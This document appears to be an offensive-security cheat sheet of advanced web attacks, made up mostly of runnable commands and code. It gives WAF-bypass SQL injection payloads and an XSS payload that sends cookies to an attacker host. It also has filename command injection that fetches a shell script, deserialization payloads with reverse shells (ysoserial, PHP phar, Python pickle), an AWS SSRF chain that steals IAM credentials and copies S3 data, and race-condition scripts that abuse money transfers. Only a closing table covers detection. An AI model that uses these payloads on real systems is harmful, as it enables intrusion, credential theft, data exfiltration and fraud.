# Advanced Exploitation Techniques

> Senior-level techniques for bypassing defenses, exploiting complex
> vulnerability classes, and chaining primitives into full compromise.

---

## WAF Bypass Playbook

### ModSecurity (OWASP CRS)

**Paranoia Level Detection:**
```bash
# Test which paranoia level is active — PL1 allows more, PL4 blocks almost everything
# Send benign SQL keywords and observe blocks
curl -s -o /dev/null -w '%{http_code}' 'http://target/?id=1+AND+1=1'       # blocked at PL2+
curl -s -o /dev/null -w '%{http_code}' 'http://target/?id=1+and+1=1'       # case variation
curl -s -o /dev/null -w '%{http_code}' "http://target/?id=1'%0aAND%0a1=1"  # newline injection
```

**Bypass Techniques:**
```bash
# Comment injection — break up SQL keywords
curl 'http://target/?id=1+UN/**/ION+SEL/**/ECT+1,2,3--+-'

# Inline comments (MySQL-specific)
curl 'http://target/?id=1+/*!50000UNION*/+/*!50000SELECT*/+1,2,3--+-'

# Case variation + encoding
curl 'http://target/?id=1+uNiOn+SeLeCt+1,2,3--+-'

# Double URL encoding
curl 'http://target/?id=1+%2555NION+%2553ELECT+1,2,3--+-'

# HTTP Parameter Pollution — send same param twice
curl 'http://target/?id=1&id=UNION+SELECT+1,2,3--+-'

# Newline/tab injection to break regex patterns
curl 'http://target/?id=1%0aUNION%0aSELECT%0a1,2,3--+-'
curl 'http://target/?id=1%09UNION%09SELECT%091,2,3--+-'

# Chunked Transfer-Encoding (bypass body inspection)
printf 'POST /login HTTP/1.1\r\nHost: target\r\nTransfer-Encoding: chunked\r\n\r\n5\r\nuser=\r\n11\r\nadmin' OR 1=1--\r\n0\r\n\r\n' | nc target 80
```

**sqlmap tamper scripts for ModSecurity:**
```bash
sqlmap -u 'http://target/?id=1' --tamper=space2comment,between,randomcase --batch
sqlmap -u 'http://target/?id=1' --tamper=charencode,space2mssqlhash --batch
sqlmap -u 'http://target/?id=1' --tamper=unionalltounion,percentage --batch
```

### Cloudflare WAF

```bash
# Cloudflare inspects headers, body, and URL — but has blind spots

# Unicode normalization bypass (Cloudflare normalizes to NFC)
curl 'http://target/?id=1+%EF%BC%B5NION+%EF%BC%B3ELECT+1,2,3--+-'

# JSON body — Cloudflare sometimes laxer on JSON than URL params
curl -X POST 'http://target/api/search' \
  -H 'Content-Type: application/json' \
  -d '{"query":"1 UNION SELECT 1,2,3-- -"}'

# Multipart form — less scrutinized than URL-encoded
curl -X POST 'http://target/search' \
  -F "query=1' UNION SELECT 1,2,3-- -"

# Find origin IP (bypass Cloudflare entirely)
# Check: DNS history (SecurityTrails), certificate transparency logs,
# email headers (MX records), Shodan/Censys for same cert fingerprint
curl -H 'Host: target.com' 'http://ORIGIN_IP/'
```

### AWS WAF

```bash
# AWS WAF uses managed rule groups — test which are active

# Size-based bypass: AWS WAF inspects first 8KB of body by default
python3 -c "print('A'*8192 + \"' UNION SELECT 1,2,3-- -\")" | \
  curl -X POST 'http://target/search' -d @-

# JSON nested objects (confuse rule matching)
curl -X POST 'http://target/api/' -H 'Content-Type: application/json' \
  -d '{"a":{"b":{"c":"1'\'' UNION SELECT 1,2,3-- -"}}}'

# Header injection (X-Forwarded-For often unfiltered)
curl -H "X-Forwarded-For: ' OR 1=1-- -" 'http://target/api/user'

# sqlmap with AWS-specific tampers
sqlmap -u 'http://target/?id=1' --tamper=space2comment,between,charencode --random-agent --batch
```

### Universal WAF Bypass Techniques
```bash
# HTTP/2 smuggling — some WAFs only inspect HTTP/1.1
curl --http2 'http://target/?id=1+UNION+SELECT+1,2,3--+-'

# Content-Type confusion
curl -X POST 'http://target/search' \
  -H 'Content-Type: text/plain' \
  -d "query=1' UNION SELECT 1,2,3-- -"

# Overlong UTF-8 encoding (legacy WAFs)
# ' = %c0%a7  or %e0%80%a7
curl 'http://target/?id=1%c0%a7+UNION+SELECT+1,2,3--+-'
```

---

## Second-Order Injection

### Second-Order SQLi
```sql
-- Step 1: Store payload via registration (INSERT is not queried, just stored)
-- Register username: admin'-- -
INSERT INTO users (username, email) VALUES ('admin''-- -', 'evil@test.com');

-- Step 2: Application uses stored value in a later query without escaping
-- When password reset triggers: SELECT * FROM users WHERE username='admin'-- -'
-- Result: returns admin row, attacker resets admin password

-- Step 3: Detect — register test accounts with SQLi payloads, then
-- trigger all features that re-use stored values:
--   Password reset, profile view, admin user list, export/report,
--   email notifications, search results
```

### Second-Order XSS
```html
<!-- Step 1: Store payload in profile name/bio -->
Profile name: <img src=x onerror=fetch('https://ATTACKER/steal?c='+document.cookie)>

<!-- Step 2: Trigger when admin views user list, exports CSV opened in browser,
     or support ticket system renders user info -->

<!-- Detection: register with XSS payload, then check every page where
     your data is reflected — admin panels, reports, emails (HTML), PDFs -->
```

### Second-Order Command Injection
```bash
# Store filename with injection payload
# Upload file named: ;curl ATTACKER/shell.sh|bash;.jpg

# Trigger when backend processes file:
#   Image resize: convert ';curl ATTACKER/shell.sh|bash;.jpg' output.jpg
#   Antivirus scan: clamscan ';curl ATTACKER/shell.sh|bash;.jpg'
#   Backup script: tar czf backup.tar.gz ';curl ATTACKER/shell.sh|bash;.jpg'
```

---

## Blind Exploitation Techniques

### Time-Based SQLi with Data Extraction
```bash
# Binary search for character values — dramatically faster than linear

# MySQL: extract database name char by char
# If ASCII of 1st char > 77, sleep 2 seconds
curl -s -o /dev/null -w '%{time_total}' \
  "http://target/?id=1' AND IF(ASCII(SUBSTRING(database(),1,1))>77,SLEEP(2),0)-- -"

# Automated with sqlmap (optimized settings for stealth)
sqlmap -u 'http://target/?id=1' --technique=T --time-sec=2 --threads=1 --batch

# PostgreSQL time-based
curl "http://target/?id=1'; SELECT CASE WHEN (SELECT LENGTH(current_user))=8 THEN pg_sleep(2) ELSE pg_sleep(0) END-- -"

# MSSQL stacked queries
curl "http://target/?id=1'; IF (SELECT LEN(DB_NAME()))=5 WAITFOR DELAY '0:0:2'-- -"
```

### DNS-Based Out-of-Band Exfiltration
```bash
# When time-based is unreliable (async processing, load balancers)
# Requires: Burp Collaborator, interactsh, or own DNS server

# MySQL DNS exfil (Windows only — UNC path)
curl "http://target/?id=1' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',database(),'.BURP-COLLAB-ID.oastify.com\\\\a'))-- -"

# PostgreSQL DNS exfil via dblink
curl "http://target/?id=1'; SELECT dblink_connect('host='||(SELECT current_user)||'.COLLAB.oastify.com dbname=x')-- -"

# MSSQL xp_dirtree DNS exfil
curl "http://target/?id=1'; EXEC master..xp_dirtree '\\\\'+DB_NAME()+'.COLLAB.oastify.com\\a'-- -"

# XXE OOB via DNS
# Send in XML body:
# <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://SECRET.COLLAB.oastify.com">]><root>&xxe;</root>

# Interactsh setup (free Burp Collaborator alternative)
interactsh-client -v    # starts listener, gives you *.oast.fun subdomain
```

### Error-Based Inference Chains
```sql
-- MySQL extractvalue/updatexml (error-based blind)
' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))-- -
' AND updatexml(1,CONCAT(0x7e,(SELECT user()),0x7e),1)-- -

-- PostgreSQL cast error
' AND 1=CAST((SELECT version()) AS int)-- -

-- MSSQL convert error
' AND 1=CONVERT(int,(SELECT @@version))-- -
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))-- -
```

---

## Deserialization — Advanced

### Java (ysoserial) — Gadget Chain Selection
```bash
# Step 1: Identify target libraries (check server headers, error pages, stack traces)
# Each gadget chain requires specific libraries on the classpath

# CommonsCollections1 — Apache Commons Collections 3.1-3.2.1
java -jar ysoserial-all.jar CommonsCollections1 'curl ATTACKER:8080/pwned' | base64 -w0

# CommonsCollections5 — Commons Collections 3.1, no SecurityManager
java -jar ysoserial-all.jar CommonsCollections5 'wget ATTACKER:8080/shell.sh -O /tmp/s.sh' | base64 -w0

# CommonsCollections6 — Commons Collections 3.1 (HashSet-based, most reliable)
java -jar ysoserial-all.jar CommonsCollections6 'bash -c {curl,ATTACKER/shell.sh}|bash' | base64 -w0

# CommonsCollections7 — Commons Collections 3.1 (Hashtable-based, alternate trigger)
java -jar ysoserial-all.jar CommonsCollections7 'id > /tmp/pwned' | base64 -w0

# CommonsCollectionsK1/K2 — Commons Collections 4.0 (different package)
java -jar ysoserial-all.jar CommonsCollectionsK1 'id' | base64 -w0

# Spring1 — spring-core + spring-beans (Spring Framework)
java -jar ysoserial-all.jar Spring1 'touch /tmp/pwned' | base64 -w0

# Groovy1 — Groovy 2.3.0-2.4.3
java -jar ysoserial-all.jar Groovy1 'id' | base64 -w0

# JRMP — triggers deserialization via JRMP (two-stage)
java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections6 'id'
# Then send JRMPClient payload pointing to attacker:8888

# Detection: look for rO0AB (base64) or aced0005 (hex) in cookies, headers, POST body
# Common injection points: ViewState, JSESSIONID-adjacent params, custom headers
```

### PHP (phar://)
```php
<?php
// Generate malicious PHAR archive
class VulnClass {
    public $cmd = 'id';
    function __destruct() { system($this->cmd); }
}

$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$payload = new VulnClass();
$payload->cmd = 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1';
$phar->setMetadata($payload);
$phar->addFromString('test.txt', 'test');
$phar->stopBuffering();
// Rename to .jpg for upload bypass
rename('exploit.phar', 'exploit.jpg');
?>
```
```bash
# Trigger via any file operation that accepts phar:// wrapper
# Vulnerable functions: file_exists(), is_dir(), filesize(), fopen(), file_get_contents()
# file(), md5_file(), filemtime(), stat(), getimagesize(), exif_read_data()
curl 'http://target/view?file=phar:///var/www/uploads/exploit.jpg/test.txt'
```

### Python (pickle)
```python
import pickle, os, base64

class RCE:
    def __reduce__(self):
        return (os.system, ('bash -i >& /dev/tcp/ATTACKER/4444 0>&1',))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)

# Injection points: cookies, API params, Redis/Memcached values, ML model files
# Detection signatures: gASV (base64 pickle), \x80\x04\x95 (raw bytes)
# YAML (PyYAML < 6.0): !!python/object/apply:os.system ['id']
```

### .NET Deserialization
```bash
# ysoserial.net — Windows tool, generate on Windows or use pre-built payloads

# ObjectDataProvider (WPF) — targets apps using XAML
ysoserial.exe -g ObjectDataProvider -f Json.Net -c 'cmd /c whoami > C:\temp\pwned.txt'

# TypeConfuseDelegate — targets BinaryFormatter
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c 'ping ATTACKER'

# TextFormattingRunProperties — targets XamlReader
ysoserial.exe -g TextFormattingRunProperties -f BinaryFormatter -c 'calc.exe'

# ViewState deserialization (ASP.NET)
# If machineKey is known (web.config leak, default key, or Sharepoint):
ysoserial.exe -p ViewState -g TextFormattingRunProperties \
  -c 'powershell IEX(IWR http://ATTACKER/shell.ps1)' \
  --validationalg="SHA1" --validationkey="KEY" \
  --generator="GENERATOR" --viewstateuserkey="USERKEY"

# Detection: look for base64 BinaryFormatter data in __VIEWSTATE, cookies, SOAP messages
```

---

## SSRF Attack Chains

### AWS Full Chain: SSRF → IAM → S3 → Data Exfil
```bash
# Step 1: Confirm SSRF
curl 'http://target/fetch?url=http://169.254.169.254/'

# Step 2: Discover IAM role name
curl 'http://target/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'
# Response: "webapp-role"

# Step 3: Extract temporary credentials
curl 'http://target/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/webapp-role'
# Response: AccessKeyId, SecretAccessKey, Token (JSON)

# Step 4: Configure AWS CLI with stolen creds
export AWS_ACCESS_KEY_ID=AKIA...
export AWS_SECRET_ACCESS_KEY=secret...
export AWS_SESSION_TOKEN=token...

# Step 5: Enumerate access
aws sts get-caller-identity
aws s3 ls
aws ec2 describe-instances --region us-east-1
aws iam list-attached-role-policies --role-name webapp-role

# Step 6: Exfiltrate from S3
aws s3 cp s3://target-bucket/sensitive-data.csv /tmp/
aws s3 ls s3://target-bucket/ --recursive | head -50

# Step 7: Pivot — check for EC2 instance connect, SSM, or other access
aws ssm describe-instance-information
aws ec2-instance-connect send-ssh-public-key --instance-id i-0123 --ssh-public-key file://~/.ssh/id_rsa.pub --instance-os-user ec2-user
```

### IMDSv2 Bypass Attempts
```bash
# IMDSv2 requires a token — harder to exploit via SSRF
# Step 1: Try to get token (requires PUT + custom header — most SSRFs can't do this)
curl -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600'

# If SSRF allows arbitrary methods + headers (rare), chain token → metadata
# If not, look for: proxy endpoints that forward PUT requests, SSRF in server-side code
# that uses requests library (which follows redirects and can be tricked)

# Redirect-based bypass: host a 302 redirect to metadata (sometimes works for GET-based SSRF)
# On attacker server: redirect 302 → http://169.254.169.254/latest/meta-data/
```

---

## Race Conditions

### TOCTOU (Time-of-Check-Time-of-Use)
```bash
# Classic: coupon code applied between price check and charge
# Exploit: send two requests simultaneously — both check, both apply

# Using GNU parallel for simultaneous requests
seq 1 20 | parallel -j 20 curl -s -X POST 'http://target/apply-coupon' \
  -H 'Cookie: session=TOKEN' -d 'code=DISCOUNT50'

# Using turbo-intruder (Burp extension) — more precise timing
# Python script for turbo-intruder:
# def queueRequests(target, wordlists):
#     engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=20, requestsPerConnection=1, pipeline=False)
#     for i in range(20):
#         engine.queue(target.req)
```

### Limit Bypass via Parallel Requests
```bash
# Scenario: "Transfer $100" endpoint checks balance before deducting
# Race: fire 10 transfers simultaneously — all pass balance check

# Using curl with background processes
for i in $(seq 1 10); do
  curl -s -X POST 'http://target/api/transfer' \
    -H 'Cookie: session=TOKEN' \
    -H 'Content-Type: application/json' \
    -d '{"to":"attacker","amount":100}' &
done
wait

# Using Python threading for precise control
python3 -c "
import threading, requests
def fire():
    requests.post('http://target/api/transfer',
        cookies={'session':'TOKEN'},
        json={'to':'attacker','amount':100})
threads = [threading.Thread(target=fire) for _ in range(10)]
[t.start() for t in threads]
[t.join() for t in threads]
"
```

### Double-Spend / Vote Manipulation
```bash
# Same pattern: exploit gap between read and write

# File upload race: upload file → check extension → rename
# Race window: access uploaded file before extension check completes
# Step 1: continuously request the upload path
while true; do curl -s 'http://target/uploads/shell.php'; done &
# Step 2: upload malicious file repeatedly
for i in $(seq 1 100); do
  curl -s -F 'file=@shell.php' 'http://target/upload'
done

# Account registration race: check "username available" → register
# Send 5 registration requests simultaneously to create duplicate accounts
```

### HTTP Request Smuggling (CL.TE / TE.CL)
```bash
# CL.TE: front-end uses Content-Length, back-end uses Transfer-Encoding
printf 'POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED' | nc target 80

# Detect with smuggler.py
python3 smuggler.py -u https://target/

# Or use HTTP Request Smuggler Burp extension for detection + exploitation
```

---

## Defensive Perspective — What Generates Alerts

| Technique | Log Signature | IDS/WAF Rules |
|-----------|--------------|---------------|
| WAF bypass attempts | Multiple 403s then 200 | Modsec audit log anomaly score spike |
| Second-order SQLi | Clean INSERT, dirty SELECT later | Hard to detect — app-level logging needed |
| Time-based SQLi | Slow responses (>5s) | DB slow query log, response time anomalies |
| DNS OOB exfil | Unusual DNS queries from DB server | DNS monitoring, egress filtering |
| Deserialization | Stack traces with gadget classes | Serialized object patterns in WAF rules |
| SSRF to metadata | Requests to 169.254.169.254 | VPC flow logs, metadata service access logs |
| Race conditions | Duplicate transactions in rapid succession | Rate limiting, transaction dedup logs |
